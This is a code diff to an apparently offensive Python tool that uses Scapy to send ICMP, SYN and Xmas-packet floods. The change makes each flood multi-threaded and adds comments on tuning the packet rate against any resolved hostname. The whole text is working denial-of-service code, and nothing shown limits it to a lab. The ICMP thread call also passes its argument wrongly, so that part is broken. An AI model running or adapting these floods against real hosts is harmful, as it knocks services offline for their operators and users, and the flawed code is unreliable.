@@ -135,33 +135,73 @@ def attack_UDP(method, host_url, port, duration, threads_per_method=100):
         print(f"--- Test function for {method} has finished. ---")
 
 
+def attack_icmp_helper(target):
+    send(IP(dst=target) / ICMP())
+
+
 def icmpflood(target_url, cycle):
     targets = resolve_to_ipv4(target_url)
+    all_threads = []
     for target in targets:
         for x in range(0, int(cycle)):
-            send(IP(dst=target) / ICMP())
+                t1 = threading.Thread(target=attack_icmp_helper, args=target)
+                t1.start()
+                all_threads.append(t1)
+
+                # Adjusting this sleep time will affect requests per second
+                time.sleep(0.01)
+
+        for current_thread in all_threads:
+            current_thread.join()  # Make the main thread wait for the children threads
+
+
+def attack_synflood_helper(target, targetPort):
+    send(IP(dst=target) / TCP(dport=targetPort,
+                              flags="S",
+                              seq=RandShort(),
+                              ack=RandShort(),
+                              sport=RandShort()))
 
 
 def synflood(target_url, targetPort, cycle):
+    all_threads = []
     targets = resolve_to_ipv4(target_url)
     for target in targets:
         for x in range(0, int(cycle)):
-            send(IP(dst=target) / TCP(dport=targetPort,
-                                      flags="S",
-                                      seq=RandShort(),
-                                      ack=RandShort(),
-                                      sport=RandShort()))
+            t1 = threading.Thread(target=attack_synflood_helper, args=(target, targetPort))
+            t1.start()
+            all_threads.append(t1)
+
+            # Adjusting this sleep time will affect requests per second
+            time.sleep(0.01)
+
+        for current_thread in all_threads:
+            current_thread.join()  # Make the main thread wait for the children threads
+
+
+def attack_xmas_helper(target, targetPort):
+    send(IP(dst=target) / TCP(dport=targetPort,
+                              flags="FSRPAUEC",
+                              seq=RandShort(),
+                              ack=RandShort(),
+                              sport=RandShort()))
 
 
 def xmasflood(target_url, targetPort, cycle):
+    all_threads= []
     targets = resolve_to_ipv4(target_url)
     for target in targets:
         for x in range(0, int(cycle)):
-            send(IP(dst=target) / TCP(dport=targetPort,
-                                      flags="FSRPAUEC",
-                                      seq=RandShort(),
-                                      ack=RandShort(),
-                                      sport=RandShort()))
+            t1 = threading.Thread(target=attack_xmas_helper, args=(target, targetPort))
+            t1.start()
+            all_threads.append(t1)
+
+            # Adjusting this sleep time will affect requests per second
+            time.sleep(0.01)
+
+        for current_thread in all_threads:
+            current_thread.join()  # Make the main thread wait for the children threads
+
 
 
 # Parse inputs
